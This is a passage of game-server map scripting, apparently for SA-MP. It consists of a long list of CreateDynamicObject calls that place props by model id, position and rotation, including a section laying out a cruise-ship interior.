	CreateDynamicObject(640, 603.241882, -2234.981445, 12.632478, 0.0000, 355.7028, 0.0000);
	CreateDynamicObject(640, 606.236450, -2257.243896, 12.689051, 0.0000, 0.8594, 90.0000);
	CreateDynamicObject(640, 606.289795, -2232.637695, 12.664600, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(640, 615.560608, -2232.699219, 12.663289, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(640, 620.661865, -2232.699707, 12.661005, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(640, 625.975525, -2232.680420, 12.652387, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(640, 615.606689, -2257.109375, 12.688045, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(640, 620.937683, -2257.129150, 12.686347, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(640, 626.213013, -2257.120117, 12.685967, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(2773, 609.281311, -2232.719971, 12.583917, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(2773, 612.662415, -2256.969238, 12.583536, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(3851, 603.198853, -2251.556152, 14.226922, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3851, 603.165100, -2238.156494, 14.171990, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3851, 619.095764, -2232.735352, 13.939053, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(3851, 618.611633, -2257.279297, 13.989588, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(3851, 629.841064, -2257.265869, 13.988054, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(3851, 630.323181, -2232.763672, 13.955311, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1432, 606.543335, -2253.231934, 12.099399, 0.0000, 0.0000, 67.5000);
	CreateDynamicObject(1432, 608.832642, -2244.325928, 12.073839, 0.0000, 0.0000, 22.5000);
	CreateDynamicObject(1432, 608.740723, -2249.002197, 12.098862, 0.0000, 0.0000, 101.2500);
	CreateDynamicObject(1432, 607.011414, -2239.285400, 12.099283, 0.0000, 0.0000, 67.5000);
	CreateDynamicObject(1432, 614.097046, -2237.061768, 12.122553, 0.0000, 0.0000, 56.2500);
	CreateDynamicObject(1432, 612.101013, -2240.987549, 12.098041, 0.0000, 0.0000, 146.2500);
	CreateDynamicObject(1432, 618.292114, -2236.252197, 12.118537, 0.0000, 0.0000, 45.0000);
	CreateDynamicObject(1432, 613.027100, -2249.472412, 12.122814, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1432, 622.637268, -2242.358398, 12.270464, 0.0000, 0.0000, 45.0000);
	CreateDynamicObject(1432, 622.227234, -2248.605957, 12.120566, 0.0000, 0.0000, 56.2500);
	CreateDynamicObject(1432, 617.132935, -2249.842773, 12.118819, 0.0000, 0.0000, 78.7500);
	CreateDynamicObject(1432, 618.840698, -2240.330811, 12.093403, 0.0000, 0.0000, 112.5000);
	CreateDynamicObject(1432, 606.538208, -2235.250977, 12.046408, 0.0000, 0.0000, 67.5000);
	CreateDynamicObject(1536, 627.356445, -2246.162109, 11.948219, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(1536, 627.331421, -2243.159180, 11.960999, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(747, 616.605713, -2244.994873, 11.856200, 0.0000, 0.0000, 101.2500);
	CreateDynamicObject(640, 618.881897, -2245.044189, 12.636617, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(640, 616.555664, -2242.676514, 12.637112, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(640, 614.205139, -2245.033936, 12.612748, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(640, 616.513367, -2247.397949, 12.687311, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(2780, 583.216370, -2250.145996, 6.435005, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2780, 592.939575, -2249.359131, 6.488002, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2780, 591.910889, -2240.543213, 7.151641, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2780, 581.362610, -2237.006836, 6.732891, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3515, 616.933716, -2245.918945, 9.241951, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3461, 612.478760, -2232.718506, 13.141190, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3461, 609.077698, -2257.126221, 13.116658, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1255, 659.039673, -2254.510010, 19.586637, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1255, 657.214539, -2254.956299, 19.586637, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1255, 655.226746, -2255.662598, 19.586637, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1255, 653.020508, -2255.778809, 19.586637, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1255, 650.751221, -2255.769531, 19.586637, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(626, 648.785461, -2257.569824, 21.011337, 0.0000, 0.0000, 33.7500);
	CreateDynamicObject(2596, 568.707947, -2237.185547, 14.214382, 0.0000, 0.0000, 78.7500);
	CreateDynamicObject(2627, 671.380005, -2260.012451, 12.027579, 0.0000, 0.0000, 90.0001);
	CreateDynamicObject(2627, 671.406555, -2258.350586, 12.027541, 0.0000, 0.0000, 90.0001);
	CreateDynamicObject(2627, 671.391724, -2256.725098, 11.977637, 0.0000, 0.0000, 90.0001);
	CreateDynamicObject(2628, 669.533264, -2252.078125, 12.021253, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2628, 667.052063, -2253.190186, 12.121900, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(2628, 669.336609, -2236.833252, 12.114346, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(2628, 666.780029, -2235.659180, 12.114488, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2630, 673.284790, -2239.290527, 12.113155, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2630, 673.312744, -2242.191162, 12.113093, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2630, 673.324341, -2247.635010, 12.121039, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(2630, 673.298279, -2250.481445, 12.121248, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(2631, 668.248596, -2242.061523, 12.066040, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(2632, 668.247803, -2246.660889, 12.173853, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(3461, 671.272278, -2244.566406, 12.928428, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3461, 675.084229, -2232.992676, 13.342820, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2773, 672.617432, -2236.427734, 12.511645, 0.0000, 0.0000, 90.0001);
	CreateDynamicObject(2773, 663.538513, -2232.040771, 12.613860, 0.0000, 0.0000, 92.5784);
	CreateDynamicObject(16088, 596.688721, -2245.072998, 10.119960, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(16088, 587.862915, -2245.093262, 10.118848, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(16088, 579.232849, -2245.138672, 10.018110, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(16088, 572.495850, -2251.903564, 11.523994, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(16088, 572.502686, -2238.360596, 11.525831, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1342, 616.451233, -2255.011719, 13.021036, 0.0000, 0.0000, 90.0001);
	CreateDynamicObject(1302, 638.546936, -2228.350342, 11.848853, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1302, 638.386353, -2260.617676, 11.831628, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(18368, 667.586792, -2247.550537, 6.023389, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(1487, 573.559143, -2234.796631, 13.255015, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1487, 573.654846, -2233.914307, 13.305015, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1487, 573.586731, -2235.655029, 13.305015, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1487, 573.351440, -2237.721924, 13.289170, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1487, 573.521667, -2238.422363, 13.305015, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1487, 573.331421, -2239.936035, 13.305015, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1487, 573.554443, -2240.472412, 13.305015, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1487, 573.455688, -2241.336914, 13.305015, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1487, 573.586975, -2242.640869, 13.297536, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3462, 615.668823, -2243.990234, 13.451094, 0.0000, 0.0000, 315.0001);
	CreateDynamicObject(14782, 666.964233, -2261.083984, 12.915818, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1520, 573.549561, -2242.219482, 13.116691, 0.0000, 0.0000, 326.2500);
	CreateDynamicObject(1520, 573.403564, -2235.571533, 13.166690, 0.0000, 0.0000, 326.2500);
	CreateDynamicObject(1520, 573.333069, -2238.191650, 13.166690, 0.0000, 0.0000, 326.2500);
	CreateDynamicObject(1541, 568.682922, -2236.933350, 13.484994, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(1548, 573.497314, -2236.616699, 13.094886, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1666, 573.489075, -2236.277588, 13.188326, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1302, 573.392456, -2233.179932, 10.870132, 0.0000, 0.0000, 0.0000);
	// INTERIOR CRUZEIRO
	CreateDynamicObject(19354, 1098.69495, 249.91150, 532.65131,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1101.76636, 254.17831, 532.71820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1100.28406, 255.93288, 532.71069,   0.00000, 0.00000, 90.26240);
	CreateDynamicObject(14411, 1099.65881, 248.72151, 527.81879,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1101.75793, 245.88110, 529.66357,   35.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1098.69727, 245.74561, 529.65192,   35.00000, 0.00000, 0.00000);
	CreateDynamicObject(19458, 1100.20886, 247.23460, 531.50623,   35.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 1100.01868, 244.33090, 526.28717,   0.00000, 90.00000, 0.11157);
	CreateDynamicObject(19464, 1099.55542, 243.19051, 528.19263,   0.00000, 0.00000, 270.36377);
	CreateDynamicObject(1569, 1098.72253, 243.47691, 526.36279,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1569, 1101.71460, 243.50302, 526.36090,   0.00000, 0.00000, 180.90370);
	CreateDynamicObject(19458, 1100.46008, 254.83112, 534.38422,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19354, 1097.10095, 253.82623, 532.71680,   0.00000, 0.00000, 90.37510);
	CreateDynamicObject(19446, 1095.54431, 260.66730, 532.70520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1095.55481, 260.67380, 536.10339,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1095.57727, 251.38319, 536.10461,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1095.57764, 241.76390, 536.11310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1090.77783, 259.93750, 536.15820,   0.00000, 0.00000, 90.47840);
	CreateDynamicObject(19446, 1090.67419, 263.34671, 532.72308,   0.00000, 0.00000, 90.74630);
	CreateDynamicObject(19446, 1090.74768, 261.62042, 534.55627,   0.00000, 90.00000, 90.24180);
	CreateDynamicObject(19446, 1085.92798, 264.56067, 532.75470,   0.00000, 0.00000, 1.26500);
	CreateDynamicObject(19354, 1098.67505, 252.31569, 532.63910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1095.57007, 249.05544, 532.73822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1091.14490, 244.21049, 532.76471,   0.00000, 0.00000, 270.00369);
	CreateDynamicObject(19446, 1091.18933, 242.37958, 534.39313,   0.00000, 90.00000, 270.00000);
	CreateDynamicObject(19446, 1085.31079, 241.24680, 530.99341,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19354, 1086.40430, 242.51050, 532.75763,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19354, 1085.44995, 243.20320, 532.71722,   0.00000, 0.00000, 90.17960);
	CreateDynamicObject(19446, 1091.16443, 240.73531, 536.12848,   0.00000, 0.00000, 269.79031);
	CreateDynamicObject(19446, 1081.54944, 240.70320, 532.69958,   0.00000, 0.00000, 90.43890);
	CreateDynamicObject(19446, 1081.55505, 240.70175, 536.12549,   0.00000, 0.00000, 90.45460);
	CreateDynamicObject(19446, 1085.07092, 241.57445, 532.66589,   0.00000, 90.00000, 90.00871);
	CreateDynamicObject(14416, 1084.31494, 241.06235, 531.27832,   0.00000, 0.00000, 270.83719);
	CreateDynamicObject(19446, 1075.43384, 242.43340, 534.41028,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19354, 1080.17798, 242.44279, 532.75262,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14416, 1082.17810, 241.24049, 531.31567,   -0.74000, 0.00000, 90.03580);
	CreateDynamicObject(19354, 1081.26880, 243.16200, 532.72070,   0.00000, 0.00000, 89.28870);
	CreateDynamicObject(14416, 1083.25500, 245.18547, 529.53809,   0.00000, 0.00000, 180.02457);
	CreateDynamicObject(19446, 1081.26587, 241.36269, 530.98969,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19354, 1086.76343, 243.25690, 530.82880,   0.00000, 0.00000, 90.39110);
	CreateDynamicObject(19354, 1079.59509, 243.20731, 530.96497,   0.00000, 0.00000, 90.70903);
	CreateDynamicObject(19446, 1070.55603, 245.52431, 536.17987,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1071.93274, 240.64030, 536.13647,   0.00000, 0.00000, 90.31360);
	CreateDynamicObject(19446, 1070.57373, 240.67784, 532.74799,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1081.15857, 259.81171, 532.72827,   0.00000, 0.00000, 90.35210);
	CreateDynamicObject(19446, 1081.14209, 259.83801, 536.16217,   0.00000, 0.00000, 270.56161);
	CreateDynamicObject(19446, 1070.56763, 250.30400, 532.74902,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1071.55334, 259.70721, 532.72809,   0.00000, 0.00000, 270.98505);
	CreateDynamicObject(19384, 1070.57556, 258.73123, 532.74469,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1070.51672, 258.26071, 536.16931,   0.00000, 0.00000, 0.46000);
	CreateDynamicObject(19354, 1070.56482, 256.21603, 532.74268,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1071.55957, 259.70551, 536.15271,   0.00000, 0.00000, 270.98239);
	CreateDynamicObject(19462, 1086.73889, 257.78687, 530.93542,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1090.24719, 248.84320, 530.93530,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1083.24902, 255.08591, 530.91351,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1086.75464, 248.40640, 530.92828,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1093.73071, 258.47568, 530.93201,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1090.23376, 258.47263, 530.93451,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1093.73560, 248.84169, 530.91809,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19443, 1097.85437, 255.44339, 530.93018,   0.00000, 90.00000, 270.78781);
	CreateDynamicObject(19443, 1096.27722, 255.29710, 530.93011,   0.00000, 90.00000, 90.72320);
	CreateDynamicObject(19462, 1083.25098, 245.45963, 530.90149,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1072.77490, 245.79352, 530.91022,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1079.76123, 254.90689, 530.92078,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1079.75024, 245.27684, 530.90082,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1076.25000, 245.28340, 530.90887,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19443, 1086.73743, 263.37390, 530.94360,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1072.77893, 255.41119, 530.89691,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1076.27026, 254.91310, 530.89679,   0.00000, 89.78000, -0.12000);
	CreateDynamicObject(19462, 1069.29285, 257.90280, 530.90332,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1069.28735, 248.27710, 530.90350,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1097.46936, 254.83220, 534.39093,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1093.72253, 255.12738, 537.77209,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1093.73438, 245.49870, 537.78058,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1090.23877, 255.13118, 537.77942,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1090.23511, 245.50296, 537.78418,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1086.76123, 255.11778, 537.76611,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1086.76575, 245.48996, 537.77051,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1083.26160, 255.10558, 537.77112,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1083.27856, 245.48309, 537.75739,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1079.78552, 255.08696, 537.75519,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1079.77844, 245.47099, 537.74060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1076.29419, 245.44920, 537.72803,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1076.28491, 255.07561, 537.74298,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1072.84680, 255.07465, 537.72839,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1072.83289, 245.45201, 537.71991,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1069.35522, 245.45647, 537.72247,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19458, 1069.38818, 255.06889, 537.71698,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(2434, 1093.94604, 260.59668, 531.02136,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2435, 1086.58801, 260.59634, 531.02118,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2435, 1087.49390, 260.59824, 531.02069,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2435, 1089.32251, 260.58670, 531.02118,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2435, 1088.40771, 260.59570, 531.02124,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2435, 1090.24939, 260.58386, 531.02161,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2435, 1091.16455, 260.58282, 531.01984,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2435, 1092.09253, 260.58047, 531.01996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2435, 1093.01709, 260.58997, 531.01965,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2204, 1086.52832, 263.21991, 531.03113,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2204, 1089.46704, 263.23053, 531.01862,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19325, 1088.59570, 262.77328, 530.74231,   0.00000, 0.00000, 90.58670);
	CreateDynamicObject(2452, 1086.46667, 261.60489, 530.89929,   0.00000, 0.00000, 90.51200);
	CreateDynamicObject(1548, 1087.50781, 260.55743, 532.07501,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1548, 1090.25464, 260.57932, 532.07587,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1548, 1093.05957, 260.61142, 532.07391,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1486, 1087.49500, 263.01740, 532.96033,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1487, 1087.94824, 263.03070, 533.02039,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1509, 1088.64990, 263.01941, 533.01990,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1512, 1089.41443, 263.06470, 533.00909,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1517, 1090.04224, 263.06189, 533.00720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1520, 1090.74963, 263.08151, 532.86670,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1541, 1088.74353, 261.07791, 531.82129,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1547, 1091.77747, 260.60712, 532.07477,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1547, 1088.86829, 260.60211, 532.07581,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1545, 1091.70007, 261.07809, 531.87762,   0.00000, 0.00000, 180.30020);
	CreateDynamicObject(1668, 1091.50989, 263.07620, 532.98792,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1543, 1086.83264, 260.72409, 532.07562,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1544, 1086.82935, 260.56342, 532.07568,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1520, 1089.60107, 260.78299, 532.07556,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1512, 1089.55786, 260.57269, 532.27539,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1951, 1092.38049, 260.74741, 532.25488,   0.00000, 0.00000, 341.10873);
	CreateDynamicObject(1667, 1092.34607, 260.51230, 532.17499,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1093.77295, 260.92410, 532.15527,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1093.80676, 260.82159, 532.15540,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14565, 1088.31372, 264.31470, 534.75592,   0.00000, 0.00000, 90.81410);
	CreateDynamicObject(2204, 1092.41113, 263.24341, 531.02014,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2204, 1095.34229, 263.25143, 531.01923,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19325, 1095.83752, 262.82779, 530.73920,   0.00000, 0.00000, 90.75750);
	CreateDynamicObject(1543, 1092.34839, 263.10876, 532.80927,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1544, 1093.39087, 263.11655, 532.80927,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1951, 1094.41553, 263.16089, 532.96912,   0.00000, 0.00000, 280.44708);
	CreateDynamicObject(1517, 1095.32971, 263.09271, 533.00830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1716, 1087.20935, 259.55740, 531.00330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1716, 1088.87219, 259.57220, 531.00262,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1716, 1090.78821, 259.56161, 531.00262,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1716, 1092.85425, 259.54788, 531.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19325, 1089.73206, 244.19814, 533.31049,   0.00000, 0.00000, 89.77280);
	CreateDynamicObject(19325, 1096.35266, 244.21390, 533.31488,   0.00000, 0.00000, 90.48260);
	CreateDynamicObject(19325, 1076.93567, 244.13571, 533.30859,   0.00000, 0.00000, 90.15870);
	CreateDynamicObject(957, 1086.64197, 259.94870, 534.38751,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(957, 1088.94238, 259.97125, 534.38470,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(957, 1091.27271, 259.99115, 534.37750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(957, 1093.82373, 260.00696, 534.38910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19325, 1070.30457, 244.07997, 533.31238,   0.00000, 0.00000, 90.80710);
	CreateDynamicObject(2292, 1072.00061, 244.65840, 530.97308,   0.00000, 0.00000, 87.86870);
	CreateDynamicObject(2291, 1078.06287, 244.78799, 530.98511,   0.00000, 0.00000, 180.99190);
	CreateDynamicObject(2291, 1076.20642, 244.73039, 530.97333,   0.00000, 0.00000, 180.99190);
	CreateDynamicObject(2291, 1077.12891, 244.76300, 530.97400,   0.00000, 0.00000, 180.99190);
	CreateDynamicObject(2291, 1078.98242, 244.81799, 530.99408,   0.00000, 0.00000, 180.99190);
	CreateDynamicObject(2291, 1075.29712, 244.71860, 530.97443,   0.00000, 0.00000, 180.99190);
	CreateDynamicObject(2291, 1073.43250, 244.68871, 530.97772,   0.00000, 0.00000, 180.99190);
	CreateDynamicObject(2291, 1074.34448, 244.69740, 530.97620,   0.00000, 0.00000, 180.99190);
	CreateDynamicObject(2292, 1079.41504, 244.78619, 530.98743,   0.00000, 0.00000, 180.79900);
	CreateDynamicObject(2291, 1094.95715, 252.24220, 530.98450,   0.00000, 0.00000, 270.61719);
	CreateDynamicObject(2291, 1094.96558, 251.31180, 530.98499,   0.00000, 0.00000, 270.61719);
	CreateDynamicObject(2291, 1094.96460, 250.39070, 530.98529,   0.00000, 0.00000, 270.61719);
	CreateDynamicObject(2291, 1095.00122, 249.41240, 530.98547,   0.00000, 0.00000, 270.61719);
	CreateDynamicObject(2291, 1094.99658, 248.46330, 531.00281,   0.00000, 0.00000, 270.61719);
	CreateDynamicObject(2291, 1095.00964, 247.50800, 530.98572,   0.00000, 0.00000, 270.61719);
	CreateDynamicObject(2292, 1094.95032, 252.69820, 530.98511,   0.00000, 0.00000, 271.49939);
	CreateDynamicObject(2292, 1095.03845, 246.08640, 530.98523,   0.00000, 0.00000, 180.61549);
	CreateDynamicObject(1823, 1093.57617, 250.98509, 531.00519,   0.00000, 0.00000, 90.17080);
	CreateDynamicObject(1823, 1092.63525, 247.78253, 531.00488,   0.00000, 0.00000, 270.61719);
	CreateDynamicObject(1823, 1078.00366, 246.17987, 531.00824,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1823, 1073.11548, 246.11237, 530.99792,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2878, 1088.12427, 244.29111, 532.17871,   0.00000, 0.00000, 180.47681);
	CreateDynamicObject(2878, 1091.48718, 244.30341, 532.18121,   0.00000, 0.00000, 180.22800);
	CreateDynamicObject(1723, 1094.89807, 243.61369, 534.46698,   0.00000, 0.00000, 271.16620);
	CreateDynamicObject(1723, 1092.92712, 241.34660, 534.46051,   0.00000, 0.00000, 179.99451);
	CreateDynamicObject(1723, 1089.33203, 241.38271, 534.46082,   0.00000, 0.00000, 180.45239);
	CreateDynamicObject(1723, 1075.38989, 241.28140, 534.47772,   0.00000, 0.00000, 180.62849);
	CreateDynamicObject(1723, 1071.19360, 241.43010, 534.47839,   0.00000, 0.00000, 90.62900);
	CreateDynamicObject(1723, 1078.88733, 241.32150, 534.47791,   0.00000, 0.00000, 180.99150);
	CreateDynamicObject(2315, 1073.44397, 243.55945, 534.49866,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2315, 1076.98352, 243.60974, 534.49829,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, 1075.16504, 250.59813, 530.94708,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, 1079.09863, 250.59492, 530.94659,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, 1083.05701, 250.58417, 530.94788,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, 1087.01355, 250.58929, 530.97571,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, 1087.00195, 254.56375, 530.96228,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, 1083.06104, 254.57005, 530.96002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, 1079.08142, 254.56102, 530.94739,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, 1075.14380, 254.57626, 530.93579,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19446, 1075.45190, 244.08110, 532.75378,   0.00000, 0.00000, 270.00369);
	CreateDynamicObject(2315, 1091.50879, 243.62050, 534.48083,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2315, 1087.50671, 243.66901, 534.48157,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2491, 1075.56177, 258.18320, 530.24182,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2491, 1084.80347, 258.22601, 530.22888,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2491, 1080.15381, 258.21487, 530.22601,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1520, 1093.38367, 251.82510, 531.55988,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1951, 1093.41345, 251.14070, 531.66010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1510, 1093.10193, 251.46640, 531.51978,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1093.06165, 251.77380, 531.57977,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1517, 1093.20154, 251.04590, 531.69958,   0.00000, 0.00000, 0.00000);
